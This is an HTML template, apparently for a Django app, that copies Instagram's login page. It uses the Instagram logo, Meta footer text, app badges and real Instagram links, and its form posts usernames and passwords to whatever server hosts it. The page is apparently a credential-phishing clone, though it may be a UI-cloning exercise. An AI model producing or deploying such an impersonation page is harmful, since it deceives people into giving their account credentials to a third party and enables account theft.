<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <!-- title -->
    <title>Instagram</title>

    <!-- custom css link -->
    <link rel="stylesheet" href="style.css" />

    <!-- favicon -->
    <link
      rel="shortcut icon"
      href="https://cdn-icons-png.flaticon.com/512/2111/2111463.png"
      type="image/x-icon"
    />

    <!-- boxicons cdn link -->
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css"
    />

    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap"
      rel="stylesheet"
    />
  </head>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: "Open Sans", sans-serif;
    }

    body {
    }

    .container {
      margin-top: 32px;
      height: 80vh;
      display: flex;
      gap: 40px;
      justify-content: center;
    }

    .insta__form {
      display: flex;
      flex-direction: column;
      gap: 16px;
    }

    .login__form {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 40px;
    }

    /* .form {
      flex: 1;
      height: 40vh;
      max-height: 100%;
      display: flex;
      flex-direction: column;
      justify-content: center;
      max-height: 100%;
    } */
    .form {
      flex: 1;
      height: 60vh;
      max-height: 100%;
      display: flex;
      gap: 10px;
      flex-direction: column;
      justify-content: center;
    }

    input {
      max-width: 400px;
      width: 300px;
      background-color: #ecf3ff;
      border: 0;
      padding: 10px 20px;
      border: 1px solid #eee;
      border-radius: 3px;
      outline: none;
      color: #666;
    }

    button {
      max-width: 400px;
      width: 300px;
      background-color: #0095f6;
      border: 0;
      padding: 10px 20px;
      border: 1px solid #eee;
      border-radius: 8px;
      outline: none;
      color: #fff;
      font-weight: 600;
      cursor: pointer;
    }

    .or {
      font-size: 14px;
      font-weight: 600;
      color: #666;
      text-align: center;
      margin-top: 20px;
      position: relative;
    }

    .or::before {
      content: "";
      position: absolute;
      background-color: #666;
      height: 1px;
      bottom: 7px;
      left: 20px;
      width: 100px;
    }

    .or::after {
      content: "";
      position: absolute;
      background-color: #666;
      height: 1px;
      bottom: 7px;
      right: 20px;
      width: 100px;
    }

    h3 {
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 14px;
      color: #0095f6;
      cursor: pointer;
    }

    h3 i {
      font-size: 22px;
    }

    .forget {
      margin-top: -20px;
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 12px;
      color: #385185;
      cursor: pointer;
    }

    footer {
      width: 100%;
      text-align: center;
      padding: 10px;

      position: relative; /* Remove absolute positioning */
      bottom: 0;
      left: 0;
      color: #666;
      font-size: 14px;
      font-weight: 600;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 10px;
    }

    .footer-links {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 10px;
      max-width: 90%;
    }

    .footer-links a {
      text-decoration: none;
      color: #202020;
      font-weight: 100;
      font-size: small;
      padding: 6px;
    }

    .footer-lang {
      margin-top: 10px;
    }

    .footer-lang span {
      padding: 6px;
      color: #202020;
      font-weight: 100;
      font-size: small;
    }

    .login__form {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 40px;
      border: 1px solid #ccc; /* Add a border around the login form */
      padding: 40px; /* Add padding to give space around the content */
      /* border-radius: 10px; Optional: Rounded corners for the border */
    }

    .signup-box {
      display: flex;
      align-items: center;
      justify-content: center;
      /* background-color: #f7f7f7;    */
      padding: 10px 20px;
      /* text-align: center; */
      /* border-radius: 8px; */
      width: 100%;
      /* max-width: 350px; You can adjust the width */
      height: 60px;
      border: 1px solid #ccc;
    }

    .signup-box p {
      font-size: 14px;
      color: #666;
      margin: 0;
    }

    .signup-box a {
      color: #0095f6;
      font-weight: bold;
      text-decoration: none;
    }

    .signup-box a:hover {
      text-decoration: underline;
    }

    .get-the-app {
      text-align: center;
      width: 100%;
      /* max-width: 350px; Adjust width as needed */
      /* margin-top: 4px; */
      display: flex;
      flex-direction: column;
      align-items: center; /* Centers content horizontally */
      /* gap: 20px; */
    }

    .get-the-app h3 {
      /* font-size: 16px; */
      color: #666;
      font-weight: 500;
      margin-bottom: 15px;
    }

    .app-images {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
      width: 100%;
    }

    .app-images img {
      width: auto; /* Maintain natural width */
      height: 45px; /* Set a fixed height for both images */
      max-width: 100%; /* Ensure the image won't overflow the container */
      cursor: pointer;
    }

    .app-images img:hover {
      opacity: 0.8; /* Optional: Hover effect for the images */
    }

    @media (max-width: 764px) {
      .image__login {
        display: none;
      }
    }
  </style>

  <body>
    <div class="container">
      <div class="image__login">
        <img
          src="https://imgcdn.latestmodapks.com/api/resize?url=https://latestmodapks.com/wp-content/uploads/2023/11/IGlookup-APK-1.jpeg"
          alt=""
        />
      </div>

      <div class="insta__form">
        <div class="login__form">
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png"
            width="220px"
          />

          <form class="form" method="POST">
            {% csrf_token %}
            <input
              type="text"
              name="username"
              placeholder="Phone number, username, or email"
              required
            />
            <input
              type="password"
              name="password"
              placeholder="Password"
              required
            />

            <button type="submit">Log in</button>

            <span class="or">OR</span>
          </form>

          <h3>
            <i class="bx bxl-facebook-circle"></i>
            Log in with Facebook
          </h3>

          <span class="forget"> Forgot Password? </span>
        </div>

        <div class="signup-box">
          <p>
            Don't have an account?
            <a href="https://www.instagram.com/accounts/emailsignup/"
              >Sign up</a
            >
          </p>
        </div>

        <div class="get-the-app">
          <h3>Get the app</h3>
          <div class="app-images">
            <img
              src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png"
              alt="App Store"
            />
            <img
              src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png"
              alt="Google Play"
            />
          </div>
        </div>
      </div>
    </div>

    <!-- Footer Section -->
    <footer class="footer">
      <div class="footer-links">
        <a href="#">Meta</a>
        <a href="#">About</a>
        <a href="#">Blog</a>
        <a href="#">Jobs</a>
        <a href="#">Help</a>
        <a href="#">API</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
        <a href="#">Locations</a>
        <a href="#">Instagram Lite</a>
        <a href="#">Threads</a>
        <a href="#">Contact Uploading & Non-Users</a>
        <a href="#">Meta Verified</a>
      </div>
      <div class="footer-lang">
        <span>English</span>
        <span>Â© 2025 Instagram from Meta</span>
      </div>
    </footer>
  </body>
</html>
